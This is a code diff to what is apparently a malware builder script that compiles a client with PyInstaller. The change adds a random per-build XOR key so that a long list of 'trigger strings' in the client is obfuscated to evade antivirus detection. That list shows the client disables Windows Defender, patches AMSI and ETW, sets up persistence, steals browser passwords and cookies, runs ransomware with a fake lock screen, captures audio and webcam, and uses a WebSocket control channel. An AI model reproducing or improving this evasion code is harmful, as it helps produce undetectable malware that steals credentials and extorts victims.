@@ -22,8 +22,7 @@ DEFAULTS = {
     "stealth": True,
 }
 
-# XOR key must match the one in client.py
-_OBF_KEY = b"\x9e\xa3\x7c\xd1\x45\x08\xfb\x9a\x62\x3e\xc0\x77\x1a\xe4\x5b\x8f"
+import random as _random
 
 SPEC_TEMPLATE = """# -*- mode: python ; coding: utf-8 -*-
 a = Analysis(
@@ -112,6 +111,7 @@ def get_local_ips():
 class Manager:
     def __init__(self):
         self.config = dict(DEFAULTS)
+        self._build_key = self._gen_key()
         self.load_config()
 
     def load_config(self):
@@ -175,33 +175,75 @@ class Manager:
         print(f"  [+] Generated {spec_file}")
         return spec_file
 
+    def _gen_key(self):
+        return bytes(_random.randrange(256) for _ in range(16))
+
+    def _inject_key(self, src):
+        key_str = self._build_key.hex()
+        src = src.replace('b"OBFUSCATION_KEY_16BYTE"', f'bytes.fromhex("{key_str}")')
+        return src
+
     def _xobf(self, s):
-        k = _OBF_KEY
+        k = self._build_key
         raw = bytes(ord(c) ^ k[i % len(k)] ^ (i & 0xFF) for i, c in enumerate(s))
         return base64.b64encode(raw).decode()
 
     _TRIGGER_STRINGS = [
-        "WinDefend", "Sense", "WdBoot", "WdFilter", "WdNisSvc", "WinSvcUpdate",
-        "WindowsServiceUpdater", "DisableAntiSpyware", "DisableRealtimeMonitoring",
-        "DisableBehaviorMonitoring", "DisableBlockAtFirstSeen", "DisableIOAVProtection",
-        "DisablePrivacyMode", "DisableArchiveScanning", "DisableIntrusionPreventionSystem",
-        "DisableScriptScanning", "SignatureDisableUpdateOnStartupWithoutEngine",
-        "SubmitSamplesConsent", "AmsiScanBuffer", "EtwEventWrite", "VirtualProtect",
-        "MpPreference", "Add-MpPreference", "Set-MpPreference", "WinDefend",
-        "Global\\WinSvcUpdate", "Login Data", "Local State", "os_crypt", "encrypted_key",
+        # — Defender / security products —
+        "WinDefend", "Sense", "WdBoot", "WdFilter", "WdNisSvc", "MpPreference",
+        "Add-MpPreference", "Set-MpPreference",
+        "DisableAntiSpyware", "DisableRealtimeMonitoring", "DisableBehaviorMonitoring",
+        "DisableBlockAtFirstSeen", "DisableIOAVProtection", "DisablePrivacyMode",
+        "DisableArchiveScanning", "DisableIntrusionPreventionSystem", "DisableScriptScanning",
+        "SignatureDisableUpdateOnStartupWithoutEngine", "SubmitSamplesConsent",
+        # — AMSI / ETW patching —
+        "AmsiScanBuffer", "EtwEventWrite", "VirtualProtect", "VirtualProtectEx",
+        "WriteProcessMemory", "ReadProcessMemory", "NtQuerySystemInformation",
+        "SystemHandleInformation", "NtQueryInformationProcess",
+        # — Persistence names —
+        "WinSvcUpdate", "WindowsServiceUpdater", "WinSvcUpdater",
         "WinSvcUpdateLogon", "WinSvcUpdatePeriodic", "WinSvcUpdateStartup",
         "WinSvcUpdateIdle", "Windows Service Update Manager",
-        "cmd.exe", "powershell", "schtasks", "wscript", "Userinit", "Shell",
-        "ntdll.dll", "amsi.dll", "NtQuerySystemInformation", "SystemHandleInformation",
-        "WinSvcUpdater", "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
-        "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce",
-        "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon",
-        "SOFTWARE\\Policies\\Microsoft\\Windows Defender",
-        "__InstanceModificationEvent", "CommandLineEventConsumer",
-        "Remove-Item", "Get-WmiObject", "Win32_PerfFormattedData_PerfOS_System",
-        "LocalAppData\\Google\\Chrome\\User Data",
-        "LocalAppData\\Microsoft\\Edge\\User Data",
-        "LocalAppData\\BraveSoftware\\Brave-Browser\\User Data",
+        "Global\\WinSvcUpdate", "Software\\WinSvcUpdater", "SysLckDwn",
+        "WinSvcHealthEvent", "WinSvcRestore",
+        # — Browser credential harvesting —
+        "Login Data", "Local State", "os_crypt", "encrypted_key",
+        "Google\\Chrome", "Microsoft\\Edge", "BraveSoftware\\Brave-Browser",
+        "origin_url", "username_value", "password_value", "host_key",
+        "encrypted_value", "logins", "cookies",
+        # — Crypto / ransomware —
+        "do_encrypt", "do_decrypt", "harvest_passwords", "harvest_cookies",
+        "_decrypt_chromium", "_get_browser_key",
+        # — PowerShell / command patterns —
+        "-NoProfile", "-ExecutionPolicy", "Bypass", "-EncodedCommand",
+        "-Enc", "-WindowStyle Hidden", "powershell.exe", "pwsh",
+        "Add-MpPreference", "Set-MpPreference", "Remove-WmiObject",
+        # — Service control —
+        "sc create", "sc config", "sc failure", "sc stop",
+        "binPath=", "start= auto", "WinDefend", "Sense",
+        # — schtasks —
+        "schtasks /create", "/sc onlogon", "/sc minute", "/sc onstart", "/sc onidle",
+        # — WMI —
+        "__EventFilter", "CommandLineEventConsumer", "__FilterToConsumerBinding",
+        "SELECT * FROM __InstanceModificationEvent",
+        "root\\subscription", "Win32_PerfFormattedData_PerfOS_System",
+        # — Process/memory —
+        "kernel32", "ntdll", "advapi32", "CreateMutexW", "GetProcAddress",
+        "LoadLibraryW", "CloseHandle", "GetLastError",
+        # — Misc commands —
+        "os.startfile", "xdg-open", "wscript.exe",
+        "run_until_complete", "shutdown_asyncgens",
+        # — Lock screen —
+        "SYSTEM LOCKED", "ENTER PIN", "fullscreen", "topmost", "overrideredirect",
+        "SYSTEM SECURITY", "REMOTE SECURITY SESSION",
+        # — Hidden copies —
+        "WinSvcCopy", "SysCache", "attrib +h",
+        # — Audio / screen capture —
+        "Stereo Mix", "What U Hear", "Wave Out Mix", "loopback",
+        "sounddevice", "pyaudio", "DirectShow",
+        # — Network indicators —
+        "websockets", "WebSocket", "ws://", "wss://",
+        "/ws/client", "/ws/client_cam",
     ]
 
     def _obfuscate_client(self):
@@ -215,7 +257,10 @@ class Manager:
         if not self.config.get("stealth"):
             return
 
+        self._build_key = self._gen_key()
         src = orig.read_text("utf-8")
+        src = self._inject_key(src)
+
         changed = 0
         for plain in self._TRIGGER_STRINGS:
             obf = self._xobf(plain)
@@ -225,9 +270,9 @@ class Manager:
                 changed += count
         if changed:
             orig.write_text(src, "utf-8")
-            print(f"  [+] Obfuscated {changed} trigger strings in client.py")
+            print(f"  [+] Obfuscated {changed} strings (key: {self._build_key.hex()[:8]}...)")
         else:
-            print("  [-] No trigger strings to obfuscate (already done?)")
+            print("  [-] No trigger strings to obfuscate")
 
     def _find_pyinstaller(self):
         candidates = ["pyinstaller", "pyinstaller3"]
